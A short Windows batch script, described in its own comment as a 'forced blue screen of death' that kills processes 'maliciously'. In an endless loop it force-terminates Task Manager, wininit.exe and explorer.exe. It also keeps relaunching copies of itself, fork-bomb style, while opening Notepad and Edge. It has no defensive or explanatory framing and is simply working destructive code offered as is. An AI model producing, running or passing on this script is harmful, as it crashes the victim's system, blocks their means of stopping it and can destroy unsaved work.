@echo off
REM -this is a forced blue screen of death it will kill all processes maliciously
title FBSOD %username% %date% process %random%
:start
color 02
taskkill /f /im Taskmgr.exe
start /min FBSOD.bat
taskkill /f /im wininit.exe
taskkill /f /im explorer.exe
start /min FBSOD.bat
start notepad.exe
start msedge.exe
goto start
